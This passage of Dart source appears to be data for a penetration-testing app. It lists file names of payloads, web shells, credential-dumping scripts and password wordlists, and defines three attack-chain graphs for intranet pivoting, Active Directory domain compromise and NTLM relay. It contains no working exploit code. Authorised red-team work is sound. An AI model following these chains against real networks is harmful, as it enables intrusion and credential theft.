    PlatformFile(name: 'shell_x64.exe', size: '68 KB', type: 'exe', date: '2024-04-08'),
  ],
  '/payloads/linux': [
    PlatformFile(name: 'reverse_tcp_x64.elf', size: '62 KB', type: 'elf', date: '2024-04-10'),
    PlatformFile(name: 'meterpreter_x64.elf', size: '198 KB', type: 'elf', date: '2024-04-10'),
  ],
  '/payloads/web': [
    PlatformFile(name: 'shell.php', size: '4 KB', type: 'php', date: '2024-03-25'),
    PlatformFile(name: 'shell.aspx', size: '6 KB', type: 'aspx', date: '2024-03-25'),
    PlatformFile(name: 'tunnel.php', size: '18 KB', type: 'php', date: '2024-02-15'),
  ],
  '/scripts/powershell': [
    PlatformFile(name: 'Invoke-Mimikatz.ps1', size: '340 KB', type: 'ps1', date: '2024-01-30'),
    PlatformFile(name: 'PowerView.ps1', size: '780 KB', type: 'ps1', date: '2024-02-05'),
    PlatformFile(name: 'PowerUp.ps1', size: '220 KB', type: 'ps1', date: '2024-02-05'),
    PlatformFile(name: 'Invoke-Kerberoast.ps1', size: '45 KB', type: 'ps1', date: '2024-01-20'),
  ],
  '/scripts/python': [
    PlatformFile(name: 'ntlmrelayx.py', size: '88 KB', type: 'py', date: '2024-03-15'),
    PlatformFile(name: 'secretsdump.py', size: '112 KB', type: 'py', date: '2024-03-15'),
    PlatformFile(name: 'psexec.py', size: '34 KB', type: 'py', date: '2024-03-15'),
    PlatformFile(name: 'GetUserSPNs.py', size: '28 KB', type: 'py', date: '2024-03-15'),
  ],
  '/scripts/bash': [
    PlatformFile(name: 'recon.sh', size: '12 KB', type: 'sh', date: '2024-02-01'),
    PlatformFile(name: 'enum_linux.sh', size: '28 KB', type: 'sh', date: '2024-02-01'),
  ],
  '/wordlists': [
    PlatformFile(name: 'rockyou.txt', size: '133 MB', type: 'txt', date: '2023-01-01'),
    PlatformFile(name: 'top1000.txt', size: '8 KB', type: 'txt', date: '2023-06-01'),
    PlatformFile(name: 'common_passwords.txt', size: '2 MB', type: 'txt', date: '2023-06-01'),
  ],
  '/tools/windows': [
    PlatformFile(name: 'nc.exe', size: '28 KB', type: 'exe', date: '2023-01-01'),
    PlatformFile(name: 'procdump.exe', size: '380 KB', type: 'exe', date: '2023-01-01'),
  ],
  '/tools/linux': [
    PlatformFile(name: 'nc', size: '22 KB', type: 'elf', date: '2023-01-01'),
    PlatformFile(name: 'socat', size: '340 KB', type: 'elf', date: '2023-01-01'),
  ],
};

// Attack Chains
const List<Map<String, dynamic>> kAttackChains = [
  {
    'id': 'basic_intranet',
    'name': '基础内网渗透链',
    'desc': '代理搭建 → 内网探测 → 漏洞利用 → 权限维持',
    'icon': '🔗',
    'nodes': [
      {'toolId': 'frp', 'x': 80.0, 'y': 100.0},
      {'toolId': 'proxychains', 'x': 80.0, 'y': 260.0},
      {'toolId': 'fscan', 'x': 80.0, 'y': 420.0},
      {'toolId': 'nmap', 'x': 340.0, 'y': 420.0},
      {'toolId': 'metasploit', 'x': 200.0, 'y': 580.0},
      {'toolId': 'mimikatz', 'x': 200.0, 'y': 740.0},
    ],
    'connections': [
      {'from': 0, 'to': 1},
      {'from': 1, 'to': 2},
      {'from': 1, 'to': 3},
      {'from': 2, 'to': 4},
      {'from': 3, 'to': 4},
      {'from': 4, 'to': 5},
    ],
  },
  {
    'id': 'domain_attack',
    'name': '域渗透攻击链',
    'desc': 'BloodHound分析 → Kerberoasting → DCSync → 黄金票据',
    'icon': '🏰',
    'nodes': [
      {'toolId': 'bloodhound', 'x': 80.0, 'y': 100.0},
      {'toolId': 'kerberoasting', 'x': 80.0, 'y': 260.0},
      {'toolId': 'hashcat', 'x': 80.0, 'y': 420.0},
      {'toolId': 'dcsync', 'x': 340.0, 'y': 260.0},
      {'toolId': 'golden', 'x': 200.0, 'y': 580.0},
    ],
    'connections': [
      {'from': 0, 'to': 1},
      {'from': 1, 'to': 2},
      {'from': 0, 'to': 3},
      {'from': 2, 'to': 4},
      {'from': 3, 'to': 4},
    ],
  },
  {
    'id': 'ntlm_relay',
    'name': 'NTLM中继攻击链',
    'desc': 'Responder投毒 → ntlmrelayx中继 → 横向移动',
    'icon': '🔄',
    'nodes': [
      {'toolId': 'responder', 'x': 80.0, 'y': 100.0},
      {'toolId': 'printerbug', 'x': 340.0, 'y': 100.0},
      {'toolId': 'ntlmrelayx', 'x': 200.0, 'y': 260.0},
      {'toolId': 'secretsdump', 'x': 200.0, 'y': 420.0},
      {'toolId': 'psexec', 'x': 200.0, 'y': 580.0},
    ],
    'connections': [
      {'from': 0, 'to': 2},
      {'from': 1, 'to': 2},
      {'from': 2, 'to': 3},
      {'from': 3, 'to': 4},
    ],
  },
];
